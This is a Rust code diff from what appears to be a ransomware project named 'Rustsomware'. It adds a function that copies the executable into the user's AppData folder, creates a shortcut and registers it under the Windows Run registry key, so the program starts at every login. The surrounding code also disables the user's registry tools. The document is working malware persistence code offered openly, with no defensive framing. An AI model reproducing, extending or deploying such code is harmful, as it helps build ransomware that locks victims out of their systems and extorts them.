@@ -1,3 +1,6 @@
+use dirs;
+use mslnk::ShellLink;
+use std::fs;
 use std::path::Path;
 use std::str;
 use winreg;
@@ -248,4 +251,50 @@ pub fn lock_down_system() {
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
     let (key, disp) = hkcu.create_subkey(&path).unwrap();
     key.set_value("DisableRegistryTools", &1u32);
+}
+
+pub fn start_ransomware_on_startup() {
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    let (key, disp) = hkcu.create_subkey(&path).unwrap();
+    let run = hkcu
+        .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .unwrap();
+
+    // Check if program is not already in startup, if is not goes on
+    match run.get_value::<String, String>(String::from("Rustsomware")) {
+        Ok(_) => return,
+        Err(_) => (),
+    };
+
+    // Copy the program to a different path
+    match get_home_dir() {
+        Some(dir) => {
+            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
+            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\rustsomware.exe";
+            let lnk = target.clone() + ".lnk";
+            fs::create_dir(&destination);
+            match fs::copy("rustsomware.exe", &target) {
+                Ok(_) => match ShellLink::new(&target) {
+                    Ok(sl) => {
+                        sl.create_lnk(&lnk);
+                        key.set_value("Rustsomware", &("\"".to_owned() + &lnk + "\""));
+                    }
+                    Err(_) => (),
+                },
+                Err(_) => (),
+            }
+        }
+        None => (),
+    }
+}
+
+fn get_home_dir() -> Option<String> {
+    match dirs::home_dir() {
+        Some(path) => match path.to_str() {
+            Some(path_str) => Some(path_str.to_owned()),
+            None => None,
+        },
+        None => None,
+    }
 }
